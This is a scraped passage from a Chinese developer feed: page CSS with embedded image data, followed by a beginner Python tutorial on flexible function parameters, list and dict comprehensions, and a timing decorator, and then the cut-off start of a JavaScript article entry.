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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>刚学会Python基础语法，却写不出简洁又灵活的代码？别慌！今天分享3个"进阶偏基础"的实用知识点，每个都带可直接运行的代码示例，让你从"能跑就行"升级到"写得漂亮"～</p>
<h2 data-id="heading-0">一、函数参数进阶：告别"参数不够用"的尴尬</h2>
<p>基础函数的固定参数的太死板？试试默认参数、*args和**kwargs，灵活应对各种传参场景！</p>
<p>python</p>
<h4 data-id="heading-1">1. 默认参数：给参数设个"备胎"</h4>
<p>def order_coffee(name, sugar=2):
"""点咖啡，默认加2块糖"""
return f"一杯{name}，加{sugar}块糖"</p>
<p>print(order_coffee("拿铁"))  # 输出：一杯拿铁，加2块糖（用默认值）
print(order_coffee("美式", 0))  # 输出：一杯美式，加0块糖（覆盖默认值）</p>
<h4 data-id="heading-2">2. *args：接收任意个位置参数（打包成元组）</h4>
<p>def sum_all(*args):
"""计算任意个数的和"""
return sum(args)</p>
<p>print(sum_all(1, 2, 3))  # 输出：6
print(sum_all(10, 20, 30, 40))  # 输出：100</p>
<h4 data-id="heading-3">3. kwargs：接收任意个关键字参数（打包成字典）</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_user</span>(<span class="hljs-params">**kwargs</span>):
    <span class="hljs-string">"""打印用户信息，参数可多可少"""</span>
    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> kwargs.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{key}</span>：<span class="hljs-subst">{value}</span>"</span>)

print_user(name=<span class="hljs-string">"小李"</span>, age=<span class="hljs-number">25</span>, city=<span class="hljs-string">"上海"</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># name：小李</span>
<span class="hljs-comment"># age：25</span>
<span class="hljs-comment"># city：上海</span>
</code></pre>
<p> </p>
<h2 data-id="heading-4">二、列表推导式：一行代替3行循环，效率颜值双在线</h2>
<p>还在写冗长的for循环生成列表？列表推导式让你一行搞定，执行效率还更高！</p>
<pre><code class="hljs language-python" lang="python">  
<span class="hljs-comment"># 场景：筛选1-10中的偶数，再乘以2</span>
<span class="hljs-comment"># 基础写法（3行代码）</span>
old_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>))
new_list = []
<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> old_list:
    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        new_list.append(num * <span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(new_list)  <span class="hljs-comment"># 输出：[4, 8, 12, 16, 20]</span>

<span class="hljs-comment"># 进阶写法（1行列表推导式）</span>
new_list_fast = [num * <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> old_list <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]
<span class="hljs-built_in">print</span>(new_list_fast)  <span class="hljs-comment"># 输出：[4, 8, 12, 16, 20]</span>

<span class="hljs-comment"># 扩展：字典推导式（快速生成字典）</span>
dict_example = {num: <span class="hljs-string">f"数字<span class="hljs-subst">{num}</span>"</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)}
<span class="hljs-built_in">print</span>(dict_example)  <span class="hljs-comment"># 输出：{1: '数字1', 2: '数字2', 3: '数字3', 4: '数字4'}</span>
 
</code></pre>
<h2 data-id="heading-5">三、装饰器：给函数"穿外套"，不改代码加功能</h2>
<p>想给函数加日志、计时功能，又不想修改原代码？装饰器就是Python的"黑科技"！</p>
<pre><code class="hljs language-python" lang="python">  
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 定义装饰器：计算函数运行时间</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">time_calculator</span>(<span class="hljs-params">func</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        start = time.time()
        result = func(*args, **kwargs)  <span class="hljs-comment"># 执行原函数</span>
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"函数<span class="hljs-subst">{func.__name__}</span>运行耗时：<span class="hljs-subst">{end - start:<span class="hljs-number">.4</span>f}</span>秒"</span>)
        <span class="hljs-keyword">return</span> result
    <span class="hljs-keyword">return</span> wrapper

<span class="hljs-comment"># 用@符号给函数"穿外套"</span>
<span class="hljs-meta">@time_calculator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">slow_task</span>(<span class="hljs-params">n</span>):
    <span class="hljs-string">"""模拟耗时操作：暂停n秒"""</span>
    time.sleep(n)
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"任务完成（暂停了<span class="hljs-subst">{n}</span>秒）"</span>

<span class="hljs-comment"># 调用函数（自动触发装饰器功能）</span>
result = slow_task(<span class="hljs-number">1</span>)
<span class="hljs-built_in">print</span>(result)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 函数slow_task运行耗时：1.0012秒</span>
<span class="hljs-comment"># 任务完成（暂停了1秒）</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解JavaScript 中 this 的底层设计：从执行上下文到调用机制]]></title>    <link>https://juejin.cn/post/7579819594271178790</link>    <guid>https://juejin.cn/post/7579819594271178790</guid>    <pubDate>2025-12-04T11:19:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594271178790" data-draft-id="7579800429375291442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解JavaScript 中 this 的底层设计：从执行上下文到调用机制"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-04T11:19:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tzarevich"/> <meta itemprop="url" content="https://juejin.cn/user/578786070367529"/></div> <div itemprop="publisher" 